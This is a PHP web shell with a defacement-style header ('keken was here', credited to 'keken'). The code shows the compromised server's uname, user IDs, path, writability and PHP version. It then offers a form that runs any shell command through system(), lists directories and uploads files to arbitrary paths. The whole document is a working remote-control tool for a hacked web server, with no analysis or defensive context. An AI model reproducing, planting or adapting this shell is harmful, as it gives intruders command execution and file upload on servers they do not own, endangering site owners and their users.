<title>keken was here !!!</title><div align="left">
  <p align="center"><br>
<font face="courier new" size="4" color="777777"><b><center><h1><marquee>---=[ #pekanbaru ]=---</marquee></h1></center></b></font></body></div>
<style>body{font-family:trebuchet ms;font-size:16px;color:red;background-color:black}hr{width:100%;height:2px;}</style>
<p align="center"><b><font size="7" face="Century Gothic">Powered By</font></b></p>
<center><img src="http://photos-p.friendster.com/photos/29/72/62872792/1_468731397l.jpg" width=200 height=300 alt="I Luv U..I MisS U"></center>
<p align="center"><b><font size="6" face="Century Gothic">--==[ keken ]==--</font></b></p>
<p align="center">&nbsp;</p>

<div>

<b>#</b> Released by : <b> keken</b></font>&nbsp;<font size="4" face="comic sans MS"><br>

</font>
  </p>
  <hr><hr>
  <p> <font face="comic sans MS" style="font-size: 9pt"><b>
  <br>

<hr size="1">
<div align="left"><b><?php
closelog( );
$user = get_current_user( );
$login = posix_getuid( );
$euid = posix_geteuid( );
$ver = phpversion( );
$gid = posix_getgid( );
if ($chdir == "") $chdir = getcwd( );
if(!$hendi)$hendi=exec("hendi");
?>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
<?php
$uname = posix_uname( );
while (list($info, $value) = each ($uname)) {
?>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b><span style="font-size: 9pt"><?= $info ?>
<span style="font-size: 9pt">:</b> <?= $value ?></span></DIV></TD>
</TR>
<?php
}
?>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">User Info:</b> uid=<?= $login ?>(<?= $whoami?>) euid=<?= $euid ?>(<?= $whoami?>) gid=<?= $gid ?>(<?= $whoami?>)</span></DIV></TD>

</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">Current Path:</b> <?= $chdir ?></span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">Permission Directory:</b> <? if(@is_writable($chdir)){ echo "Yes"; }else{ echo "No"; } ?>
</span></DIV></TD>
</TR>  
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">Server Services:</b> <?= "$SERVER_SOFTWARE $SERVER_VERSION"; ?>
</span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">Server Address:</b> <?= "$SERVER_ADDR $SERVER_NAME"; ?>
</span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">Script Current User:</b> <?= $user ?></span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">PHP Version:</b> <?= $ver ?></span></DIV></TD>
</TR>
</TABLE>
</b></font>
<?php

set_magic_quotes_runtime(0);

$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);

$UName  = `uname -a`;
$SCWD   = `pwd`;
$UserID = `id`;

if( $currentWD == "" ) {
    $currentWD = $SCWD;
}
if( $_POST['_act'] == "List files!" ) {
    $currentCMD = "ls -la";
}
print "<form method=post enctype=\"multipart/form-data\"><table>";

print "<tr><td><b>Execute command:</b></td><td><input size=100 name=\"_cmd\" value=\"".$currentCMD."\"></td>";
print "<td><input type=submit name=_act value=\"Execute!\"></td></tr>";

print "<tr><td><b>Change directory:</b></td><td><input size=100 name=\"_cwd\" value=\"".$currentWD."\"></td>";
print "<td><input type=submit name=_act value=\"List files!\"></td></tr>";

print "<tr><td><b>Upload file:</b></td><td><input size=85 type=file name=_upl></td>";
print "<td><input type=submit name=_act value=\"Upload!\"></td></tr>";

print "</table></form>";

$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);

if( $_POST['_act'] == "Upload!" ) {
if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
print "<center><b>Upload Error!</b></center>";
} else {
print "<center><pre>";
system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
print "</pre><b>Upload Successfully!</b></center>";
}    
} else {
print "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
$currentCMD = "cd ".$currentWD.";".$currentCMD;
system("$currentCMD 1> /tmp/usil 2>&1; cat /tmp/usil; rm -rf /tmp/usil");
print "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr size='1'><center><b>Selesai!</b></center>";
}

exit;

?></body></font></font></b></font>




